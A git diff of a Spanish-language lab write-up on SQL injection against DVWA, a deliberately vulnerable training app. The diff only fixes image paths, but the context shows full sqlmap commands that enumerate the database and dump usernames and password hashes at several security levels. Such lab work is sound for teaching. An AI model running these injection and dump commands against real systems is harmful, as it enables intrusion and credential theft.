@@ -42,24 +42,24 @@ Seguidamente, se inspecciona de manera gradual la estructura de la base de datos
     ```bash
     sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch --dbs
     ```
-    ![dbs](assets/sqli_dbs.png)
+    ![dbs](/SQLI/assets/sqli_dbs.png)
 
 - A **nivel relacional** en el esquema `dvwa`:
     ```bash
     sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch -D dvwa --tables
     ```
-    ![tabs](assets/sqli_tabs.png)
+    ![tabs](/SQLI/assets/sqli_tabs.png)
 
 - A nivel de **tabla** en la entidad `users`:
     ```bash
     sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch -D dvwa -T users --columns
     ```
-    ![cols](assets/sqli_cols.png)
+    ![cols](/SQLI/assets/sqli_cols.png)
 
 
 Finalmente, se obtiene el contenido de la tabla de usuarios con el siguiente comando, que vuelca las columnas seleccionadas (y se se desea se pueden desencriptar):
 
-![dump](assets/sqli_dump.png)
+![dump](/SQLI/assets/sqli_dump.png)
 
 ```bash
 sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch -D dvwa -T users -C user,password --dump
@@ -75,7 +75,7 @@ Se ha escogido la primera opción por simplicidad, ya que el comando necesario p
 sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low"  --data "id=1&Submit=Submit" --batch --dbs
 ```
 
-![med](assets/sqli_med.png)
+![med](/SQLI/assets/sqli_med.png)
 
 Se puede evitar la fase de inspección de la base de datos, aunque si fuera necesario el procedimiento es análogo.
 
@@ -90,7 +90,7 @@ sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/session-input.php" --cooki
 ```
 
 El efecto de añadir la url secundaria es capturar la redirección para obtener los resultados de la inyección.
-![redir](assets/sqli_redir_hi.png)
+![redir](/SQLI/assets/sqli_redir_hi.png)
 
 El resultado es de nuevo la lista de usuarios con sus contraseñas:
-![hi](assets/sqli_hi.png)
+![hi](/SQLI/assets/sqli_hi.png)
